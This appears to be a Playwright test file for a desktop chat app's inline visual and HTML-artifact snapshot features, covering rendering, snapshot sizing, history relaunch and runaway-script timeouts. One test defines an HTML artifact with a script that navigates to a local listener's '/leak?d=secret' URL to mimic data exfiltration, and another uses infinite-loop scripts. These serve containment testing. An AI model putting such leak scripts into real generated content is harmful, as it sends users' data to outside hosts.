import { readFile, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { expect, finishLmStudioOnboarding, test } from "./fixtures";

type StoredAttachment = { id: string; mimeType: string; kind: string; size: number; data?: string };
type StoredMessage = {
  id: string;
  role: string;
  attachments?: StoredAttachment[];
  uiVisuals?: { id: string; title: string }[];
  htmlArtifacts?: { mediaId: string; title: string }[];
  visualSnapshots?: { visualId: string; attachmentId: string }[];
};

async function latestAssistant(root: string): Promise<StoredMessage | undefined> {
  let metas: { id: string; botId?: string; workspaceId?: string }[] = [];
  try {
    metas = JSON.parse(await readFile(path.join(root, "chats", "index.json"), "utf8"));
  } catch (error) {
    if ((error as NodeJS.ErrnoException).code === "ENOENT") return undefined;
    throw error;
  }
  for (const meta of metas.filter((chat) => !chat.botId && chat.workspaceId !== "assistant")) {
    const chat = JSON.parse(await readFile(path.join(root, "chats", `${meta.id}.json`), "utf8")) as { messages: StoredMessage[] };
    const assistant = [...chat.messages].reverse().find((message) => message.role === "assistant");
    if (assistant?.uiVisuals?.length || assistant?.htmlArtifacts?.length) return assistant;
  }
  return undefined;
}

function pngSize(data: string): { width: number; height: number } {
  const bytes = Buffer.from(data, "base64");
  return { width: bytes.readUInt32BE(16), height: bytes.readUInt32BE(20) };
}

const MARKUP = `<Visual title="Plan options" state={{plan: "team"}}>
  <Tabs bind="plan" label="Plan" options={[{value:"solo",label:"Solo"},{value:"team",label:"Team"}]} />
  <If test={$plan == "solo"}><Stat label="Price" value={12} format="currency" /></If>
  <If test={$plan == "team"}><Stat label="Price" value={60} format="currency" /></If>
  <Button variant="accent" action={sendPrompt("Start the " + $plan + " plan")}>Choose plan</Button>
</Visual>`;

const HTML = `<div style="padding:12px"><h2 style="margin:0">Weekly total</h2><p>1,460 users</p></div>`;

test("a reply draws native and HTML visuals inline, and both get snapshots for phones", async ({ aiden }) => {
  const { page, lmStudio, userDataDir, app } = aiden;
  await finishLmStudioOnboarding(page);
  const prompt = "Inline visuals scenario: show my plan options and weekly total.";
  const scenario = lmStudio.enqueueToolScenario!({
    prompt,
    calls: [
      { name: "render_ui", arguments: { title: "Plan options", markup: MARKUP } },
      { name: "render_artifact", arguments: { title: "Weekly total", layout: "wide", html: HTML } },
    ],
    finalText: "Here are your plan options and weekly total.",
  });
  await page.locator("textarea").first().fill(prompt);
  await page.getByRole("button", { name: "Send message" }).click();
  await expect(page.getByText("Here are your plan options and weekly total.", { exact: true }).first()).toBeVisible({ timeout: 45_000 });
  expect(scenario.error).toBeUndefined();
  expect(scenario.issuedToolNames).toEqual(["render_ui", "render_artifact"]);
  // A visual's local state changed while it is still streaming resets when the reply settles,
  // so wait for generation to finish before interacting with it.
  await expect(page.getByRole("button", { name: "Stop generating" })).toBeHidden();

  // The native visual draws with Aiden's components and works without the model.
  const native = page.getByRole("figure", { name: "Plan options" });
  await expect(native).toBeVisible();
  await expect(native.getByText("$60.00")).toBeVisible();
  await native.getByRole("tab", { name: "Solo" }).click();
  await expect(native.getByText("$12.00")).toBeVisible();
  // A follow-up waits for the user's confirmation.
  await native.getByRole("button", { name: "Choose plan" }).click();
  await expect(page.getByRole("group", { name: "Follow-up suggested by Plan options" })).toContainText("Start the solo plan");

  // The HTML visual renders in its sandboxed frame.
  await expect(page.locator('iframe[title="Weekly total"]')).toBeVisible();

  // Both visuals get snapshot images, stored as reserved attachments.
  await expect.poll(async () => (await latestAssistant(userDataDir))?.visualSnapshots?.length ?? 0, { timeout: 30_000 }).toBe(2);
  const message = (await latestAssistant(userDataDir))!;
  for (const ref of message.visualSnapshots ?? []) {
    const attachment = message.attachments?.find((candidate) => candidate.id === ref.attachmentId);
    expect(attachment?.kind).toBe("image");
    expect(attachment?.mimeType).toBe("image/png");
    const size = pngSize(attachment!.data!);
    expect(size.width).toBeGreaterThanOrEqual(720);
    expect(size.height).toBeGreaterThan(64);
    await test.info().attach(`snapshot-${ref.visualId}.png`, {
      body: Buffer.from(attachment!.data!, "base64"),
      contentType: "image/png",
    });
  }
  // The desktop never shows the snapshot as a second image.
  await expect(page.locator('img[alt*="Plan options"]')).toHaveCount(0);
  // The hidden capture window never became a visible application window.
  const visible = await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().filter((window) => window.isVisible()).length);
  expect(visible).toBe(1);

  // Move these real visuals into older history, where text rows skip layout.
  const reopened = await aiden.relaunch(async () => {
    const metas = JSON.parse(await readFile(path.join(userDataDir, "chats/index.json"), "utf8")) as { id: string; botId?: string; workspaceId?: string }[];
    const meta = metas.find((item) => !item.botId && item.workspaceId !== "assistant")!;
    const file = path.join(userDataDir, "chats", `${meta.id}.json`);
    const chat = JSON.parse(await readFile(file, "utf8"));
    chat.messages.push(...Array.from({ length: 64 }, (_, i) => ({ id: `later-${i}`, role: i % 2 ? "assistant" : "user", content: `Later history ${i}.`, createdAt: Date.now() + i })));
    await writeFile(file, JSON.stringify(chat));
  });
  await aiden.app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().find((window) => window.isVisible())!.setSize(1800, 1100));
  const frame = reopened.locator('iframe[title="Weekly total"]');
  await frame.scrollIntoViewIfNeeded();
  await expect(frame).toBeInViewport();
  const outerEdgeVisible = await frame.evaluate((element) => {
    const box = element.getBoundingClientRect();
    const column = element.closest('[data-subagent-chip-focus-scope]')!.getBoundingClientRect();
    const x = box.left + 8, y = box.top + Math.min(32, box.height / 2);
    return { extendsColumn: box.left < column.left - 10, hit: document.elementFromPoint(x, y) === element };
  });
  expect(outerEdgeVisible).toEqual({ extendsColumn: true, hit: true });
  const restoredNative = reopened.getByRole("figure", { name: "Plan options" });
  await restoredNative.scrollIntoViewIfNeeded();
  await restoredNative.getByRole("tab", { name: "Team" }).click();
  await expect(restoredNative.getByText("$60.00")).toBeVisible();
});

test("snapshots run guest HTML offline and keep everything down to its last margin", async ({ aiden }) => {
  const { page, lmStudio, userDataDir } = aiden;
  const hits: string[] = [];
  const server = createServer((request, response) => {
    hits.push(request.url ?? "");
    response.end("<p>leaked</p>");
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  const { port } = server.address() as AddressInfo;
  try {
    await finishLmStudioOnboarding(page);
    const prompt = "Snapshot containment scenario: draw two visuals.";
    const scenario = lmStudio.enqueueToolScenario!({
      prompt,
      calls: [
        // A visual that tries to send chat data away by navigating its own frame.
        { name: "render_artifact", arguments: { title: "Leaky", html: `<p>hello</p><script>location.href = "http://127.0.0.1:${port}/leak?d=secret";</script>` } },
        { name: "render_artifact", arguments: { title: "Tall margin", html: `<div style="height:300px;background:#0b7de5"></div><p style="margin:0 0 48px">End of visual</p>` } },
        // Grows only when the host chart library loaded inside the snapshot.
        { name: "render_artifact", arguments: { title: "Libraries", html: `<div id="probe" style="height:100px;background:#0b7de5"></div><script>if (typeof Chart === "function") document.getElementById("probe").style.height = "400px";</script>` } },
      ],
      finalText: "Both visuals are drawn.",
    });
    await page.locator("textarea").first().fill(prompt);
    await page.getByRole("button", { name: "Send message" }).click();
    await expect(page.getByText("Both visuals are drawn.", { exact: true }).first()).toBeVisible({ timeout: 45_000 });
    expect(scenario.error).toBeUndefined();

    // The queue captures in order, so a later snapshot means the first ran.
    const snapshotOf = async (title: string) => {
      const message = await latestAssistant(userDataDir);
      const artifact = message?.htmlArtifacts?.find((candidate) => candidate.title === title);
      const ref = message?.visualSnapshots?.find((candidate) => candidate.visualId === artifact?.mediaId);
      return ref ? message?.attachments?.find((attachment) => attachment.id === ref.attachmentId) : undefined;
    };
    const tallSnapshot = () => snapshotOf("Tall margin");
    await expect.poll(async () => Boolean(await snapshotOf("Libraries")), { timeout: 45_000 }).toBe(true);
    expect(hits).toEqual([]);

    // Charts in a snapshot need the host libraries; the probe grows to 400px only if they loaded.
    const libraries = pngSize((await snapshotOf("Libraries"))!.data!);
    expect((libraries.height * 752) / libraries.width).toBeGreaterThanOrEqual(420);

    // Column width 720 plus 16px padding on each side, at the display's scale.
    const size = pngSize((await tallSnapshot())!.data!);
    const cssHeight = (size.height * 752) / size.width;
    // 16 + 300 + one line of text + the 48px bottom margin + 16.
    expect(cssHeight).toBeGreaterThanOrEqual(395);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

// Guests that never yield: one reports a height and then spins on the renderer's main thread,
// the other spins before it can report anything. Neither can finish its own capture.
const SPINS_AFTER_REPORT = `<p>busy</p><script>setTimeout(() => { while (true) {} }, 50);</script>`;
const SPINS_BEFORE_REPORT = `<script>while (true) {}</script>`;

test("a runaway visual is abandoned at the snapshot timeout and the next visual still gets its snapshot", async ({ aiden }) => {
  const { page, lmStudio, userDataDir, app } = aiden;
  await finishLmStudioOnboarding(page);
  const prompt = "Runaway snapshot scenario: draw three visuals.";
  const scenario = lmStudio.enqueueToolScenario!({
    prompt,
    calls: [
      { name: "render_artifact", arguments: { title: "Spins after report", html: SPINS_AFTER_REPORT } },
      { name: "render_artifact", arguments: { title: "Spins before report", html: SPINS_BEFORE_REPORT } },
      { name: "render_artifact", arguments: { title: "Weekly total", layout: "wide", html: HTML } },
    ],
    finalText: "All three visuals are drawn.",
  });
  await page.locator("textarea").first().fill(prompt);
  await page.getByRole("button", { name: "Send message" }).click();
  await expect(page.getByText("All three visuals are drawn.", { exact: true }).first()).toBeVisible({ timeout: 45_000 });
  expect(scenario.error).toBeUndefined();
  expect(scenario.issuedToolNames).toEqual(["render_artifact", "render_artifact", "render_artifact"]);
  await expect(page.getByRole("button", { name: "Stop generating" })).toBeHidden();

  // Each runaway capture is cut off by the 6 s queue timeout; the healthy visual after them must still capture.
  const snapshotOf = async (title: string) => {
    const message = await latestAssistant(userDataDir);
    const artifact = message?.htmlArtifacts?.find((candidate) => candidate.title === title);
    const ref = message?.visualSnapshots?.find((candidate) => candidate.visualId === artifact?.mediaId);
    return ref ? message?.attachments?.find((attachment) => attachment.id === ref.attachmentId) : undefined;
  };
  await expect.poll(async () => Boolean(await snapshotOf("Weekly total")), { timeout: 30_000 }).toBe(true);
  const attachment = (await snapshotOf("Weekly total"))!;
  expect(attachment.kind).toBe("image");
  const size = pngSize(attachment.data!);
  expect(size.width).toBeGreaterThanOrEqual(720);
  expect(size.height).toBeGreaterThan(64);

  // The abandoned captures leave no extra visible window, and at most one hidden capture window remains.
  const windows = await app.evaluate(({ BrowserWindow }) =>
    BrowserWindow.getAllWindows().filter((window) => !window.isDestroyed()).map((window) => window.isVisible()),
  );
  expect(windows.filter(Boolean)).toHaveLength(1);
  expect(windows.filter((visible) => !visible).length).toBeLessThanOrEqual(1);
});
